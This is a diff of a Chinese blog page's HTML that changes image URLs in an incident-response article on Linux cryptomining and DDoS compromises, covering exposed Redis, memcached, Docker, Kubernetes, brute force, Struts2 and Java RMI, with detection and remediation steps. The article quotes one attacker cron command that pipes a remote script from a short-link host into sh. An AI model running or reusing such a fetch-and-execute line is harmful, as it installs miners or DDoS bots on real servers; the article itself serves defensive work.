@@ -120,27 +120,27 @@
 <meta property="og:site_name" content="瓦都剋">
 <meta property="og:description" content="前言从去年六月份到现在做的应急响应、事件分析大大小小的做了23十个，主要遇到的有挖矿、DDoS、短信接口盗刷、用户接口泄漏、越权信息获取、挂黑页、删数据等。本文只针对自己做的应急响应中的挖矿和DDoS两类做一下总结及自己的处置方法，帮助运维等相关人员在遇到之后能够快速响应、处置。文章有不足之处欢迎大家指出、补充。 0x01 应急事件处理流程是什么？服务器安全排查 webshell 查找  木马病毒">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/redis-1.png">
-<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/memcache-1.png">
-<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/docker-1.png">
-<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/k8s-1.png">
-<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/3389-1.png">
-<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/3389-2.png">
-<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/struts2-2.png">
-<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/javarmi-1.png">
-<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/javarmi-2.png">
-<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/yj-0.png">
-<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/yj-1.png">
-<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/yj-2.png">
-<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/yj-3.png">
-<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/yj-4.png">
-<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/yj-5.png">
-<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/yj-6.png">
-<meta property="og:updated_time" content="2018-07-10T07:27:36.810Z">
+<meta property="og:image" content="http://blog.w2n1ck.com/redis-1.png">
+<meta property="og:image" content="http://blog.w2n1ck.com/memcache-1.png">
+<meta property="og:image" content="http://blog.w2n1ck.com/docker-1.png">
+<meta property="og:image" content="http://blog.w2n1ck.com/k8s-1.png">
+<meta property="og:image" content="http://blog.w2n1ck.com/3389-1.png">
+<meta property="og:image" content="http://blog.w2n1ck.com/3389-2.png">
+<meta property="og:image" content="http://blog.w2n1ck.com/struts2-2.png">
+<meta property="og:image" content="http://blog.w2n1ck.com/javarmi-1.png">
+<meta property="og:image" content="http://blog.w2n1ck.com/javarmi-2.png">
+<meta property="og:image" content="http://blog.w2n1ck.com/yj-0.png">
+<meta property="og:image" content="http://blog.w2n1ck.com/yj-1.png">
+<meta property="og:image" content="http://blog.w2n1ck.com/yj-2.png">
+<meta property="og:image" content="http://blog.w2n1ck.com/yj-3.png">
+<meta property="og:image" content="http://blog.w2n1ck.com/yj-4.png">
+<meta property="og:image" content="http://blog.w2n1ck.com/yj-5.png">
+<meta property="og:image" content="http://blog.w2n1ck.com/yj-6.png">
+<meta property="og:updated_time" content="2018-12-14T05:50:21.151Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="关于Linux挖矿、DDOS等应急事件处置方法">
 <meta name="twitter:description" content="前言从去年六月份到现在做的应急响应、事件分析大大小小的做了23十个，主要遇到的有挖矿、DDoS、短信接口盗刷、用户接口泄漏、越权信息获取、挂黑页、删数据等。本文只针对自己做的应急响应中的挖矿和DDoS两类做一下总结及自己的处置方法，帮助运维等相关人员在遇到之后能够快速响应、处置。文章有不足之处欢迎大家指出、补充。 0x01 应急事件处理流程是什么？服务器安全排查 webshell 查找  木马病毒">
-<meta name="twitter:image" content="http://oa8y5guqs.bkt.clouddn.com/redis-1.png">
+<meta name="twitter:image" content="http://blog.w2n1ck.com/redis-1.png">
 
 
 
@@ -495,7 +495,7 @@
 <p>redis未授权访问主要被用来进行挖矿，一般手段是通过redis写入计划任务，基本上都是形如：<code>/bin/sh -c /usr/bin/curl -sL https://lnk0.com/VhscA1|sh</code>，直接进行挖矿、ddos等。</p>
 <p><strong>排查方法：</strong></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">redis-cli -h host -p port</div></pre></td></tr></table></figure>
-<p><img src="http://oa8y5guqs.bkt.clouddn.com/redis-1.png" alt=""></p>
+<p><img src="http://blog.w2n1ck.com/redis-1.png" alt=""></p>
 <p><strong>修复方法：</strong></p>
 <ul>
 <li>绑定本地访问：<code>bind 127.0.0.1</code></li>
@@ -506,7 +506,7 @@
 <p>memcache未授权访问主要被用来进行DDoS，在今年三月份爆发，攻击者利用memcached协议，发送大量带有被害者IP地址的UDP数据包给放大器主机，然后放大器主机对伪造的IP地址源做出大量回应，形成分布式拒绝服务攻击，从而形成DRDoS反射。</p>
 <p><strong>排查方法：</strong></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc host port</div></pre></td></tr></table></figure>
-<p><img src="http://oa8y5guqs.bkt.clouddn.com/memcache-1.png" alt=""></p>
+<p><img src="http://blog.w2n1ck.com/memcache-1.png" alt=""></p>
 <p><strong>修复方法：</strong></p>
 <ul>
 <li>设置memchached只允许本地访问</li>
@@ -518,7 +518,7 @@
 <p>docker未授权访问主要被用来进行挖矿，通过挂载宿主机的<code>/etc/</code>、<code>/var/spool/cron/</code>等目录，之后将相关挖矿的脚本、命令等写入到<code>/etc/crontab</code>，<code>/var/spool/cron/crontabs/root</code>中。</p>
 <p><strong>排查方法：</strong></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl http://IP:2375/containers/json</div></pre></td></tr></table></figure>
-<p><img src="http://oa8y5guqs.bkt.clouddn.com/docker-1.png" alt=""></p>
+<p><img src="http://blog.w2n1ck.com/docker-1.png" alt=""></p>
 <p><strong>修复方法：</strong></p>
 <ul>
 <li>在不必需的情况下，不要启用docker的remote api服务</li>
@@ -529,7 +529,7 @@
 <p>k8s未授权访问主要被用来挖矿，API Server 默认会开启两个端口：8080和 6443。其中 8080 端口无需认证，6443 端口需要认证，且有 TLS 保护，直接访问8080端口会返回可用的API列表。访问dashboard 页面，可以创建、修改、删除容器，查看日志等。攻击者利用的流程大体为：<code>创建新的容器 -&gt; 挂载宿主机目录 -&gt; 写 /etc/crontab</code>定时任务进行挖矿。</p>
 <p><strong>排查方法：</strong></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl http://IP:8080/</div></pre></td></tr></table></figure>
-<p><img src="http://oa8y5guqs.bkt.clouddn.com/k8s-1.png" alt=""></p>
+<p><img src="http://blog.w2n1ck.com/k8s-1.png" alt=""></p>
 <p><strong>修复方法：</strong></p>
 <ul>
 <li>配置安全组、防火墙等，禁止敏感端口对外开放</li>
@@ -583,8 +583,8 @@
 <h2 id="4、爆破"><a href="#4、爆破" class="headerlink" title="4、爆破"></a>4、爆破</h2><p>主要是Windows3389、Linux ssh爆破，爆破成功之后直接执行命令进行挖矿、DDoS。</p>
 <p><strong>排查方法：</strong></p>
 <p>网上搜索自己的密码是否被公开活在黑客字典中</p>
-<p><img src="http://oa8y5guqs.bkt.clouddn.com/3389-1.png" alt=""></p>
-<p><img src="http://oa8y5guqs.bkt.clouddn.com/3389-2.png" alt=""></p>
+<p><img src="http://blog.w2n1ck.com/3389-1.png" alt=""></p>
+<p><img src="http://blog.w2n1ck.com/3389-2.png" alt=""></p>
 <p><strong>修复方法：</strong></p>
 <ul>
 <li>严禁弱口令，使用数字+字母+特殊字符的十位以上强密码</li>
@@ -593,7 +593,7 @@
 <h2 id="5、Struts2"><a href="#5、Struts2" class="headerlink" title="5、Struts2"></a>5、Struts2</h2><p>利用Struts2反序列化命令执行，直接执行相关命令。</p>
 <p><strong>排查方法：</strong></p>
 <p>搜索网上一键扫描struts2漏洞的工具进行检测</p>
-<p><img src="http://oa8y5guqs.bkt.clouddn.com/struts2-2.png" alt=""></p>
+<p><img src="http://blog.w2n1ck.com/struts2-2.png" alt=""></p>
 <p><strong>修复方法：</strong></p>
 <ul>
 <li>及时升级Struts2相关补丁<h2 id="6、Java-RMI命令执行"><a href="#6、Java-RMI命令执行" class="headerlink" title="6、Java RMI命令执行"></a>6、Java RMI命令执行</h2></li>
@@ -601,8 +601,8 @@
 <p>RMI服务的默认开放1099端口，且暴露在公网中，并且恰好使用了Apache Commons Collections的缺陷版本，可被直接利用来进行任意命令执行。</p>
 <p><strong>排查方法：</strong></p>
 <p>使用nmap进行端口扫描</p>
-<p><img src="http://oa8y5guqs.bkt.clouddn.com/javarmi-1.png" alt=""></p>
-<p><img src="http://oa8y5guqs.bkt.clouddn.com/javarmi-2.png" alt=""></p>
+<p><img src="http://blog.w2n1ck.com/javarmi-1.png" alt=""></p>
+<p><img src="http://blog.w2n1ck.com/javarmi-2.png" alt=""></p>
 <p><strong>修复方法：</strong></p>
 <ul>
 <li>升级相应缺陷版本</li>
@@ -657,21 +657,21 @@
 <h1 id="附：记一次事件分析详细排查步骤"><a href="#附：记一次事件分析详细排查步骤" class="headerlink" title="附：记一次事件分析详细排查步骤"></a>附：记一次事件分析详细排查步骤</h1><h2 id="1、事件缘由"><a href="#1、事件缘由" class="headerlink" title="1、事件缘由"></a>1、事件缘由</h2><p>客户反馈服务器D盘里面的文件被删除了，要求排查什么原因导致的，什么漏洞引发的。</p>
 <h2 id="2、事件分析"><a href="#2、事件分析" class="headerlink" title="2、事件分析"></a>2、事件分析</h2><p>前期准备工作：端口扫描、黑盒漏扫、弱口令、是否存在命令执行相关漏洞等，未果，进入服务器排查。</p>
 <p>D盾全盘webshell查杀发现恶意文件（中间的一些用户，组，进程，日志排查步骤等我就不说了）</p>
-<p><img src="http://oa8y5guqs.bkt.clouddn.com/yj-0.png" alt=""></p>
+<p><img src="http://blog.w2n1ck.com/yj-0.png" alt=""></p>
 <p>webshell名为enshell.aspx</p>
 <p>根据该webshell文件名查找日志</p>
-<p><img src="http://oa8y5guqs.bkt.clouddn.com/yj-1.png" alt=""></p>
+<p><img src="http://blog.w2n1ck.com/yj-1.png" alt=""></p>
 <p>定位记录该恶意文件的日志信息，找到攻击者IP</p>
-<p><img src="http://oa8y5guqs.bkt.clouddn.com/yj-2.png" alt=""></p>
+<p><img src="http://blog.w2n1ck.com/yj-2.png" alt=""></p>
 <p>攻击者IP：110.87.13.61</p>
 <p>威胁情报来一波</p>
-<p><img src="http://oa8y5guqs.bkt.clouddn.com/yj-3.png" alt=""></p>
+<p><img src="http://blog.w2n1ck.com/yj-3.png" alt=""></p>
 <p>根据IP定位黑客攻击点</p>
-<p><img src="http://oa8y5guqs.bkt.clouddn.com/yj-4.png" alt=""></p>
+<p><img src="http://blog.w2n1ck.com/yj-4.png" alt=""></p>
 <p>定位记录详情</p>
-<p><img src="http://oa8y5guqs.bkt.clouddn.com/yj-5.png" alt=""></p>
+<p><img src="http://blog.w2n1ck.com/yj-5.png" alt=""></p>
 <p>定位漏洞源头</p>
-<p><img src="http://oa8y5guqs.bkt.clouddn.com/yj-6.png" alt=""></p>
+<p><img src="http://blog.w2n1ck.com/yj-6.png" alt=""></p>
 <p>至此，事件分析结束。</p>
 <h2 id="3、事件结论"><a href="#3、事件结论" class="headerlink" title="3、事件结论"></a>3、事件结论</h2><p>由此可知：黑客先利用<code>/xxx/upload2Server/</code>接口上传了恶意文件，再利用<code>/xxx/checkfileexists/</code>判断文件是否上传成功，最后利用，<code>/xxx/executecmd/</code>执行了该恶意文件。</p>
 
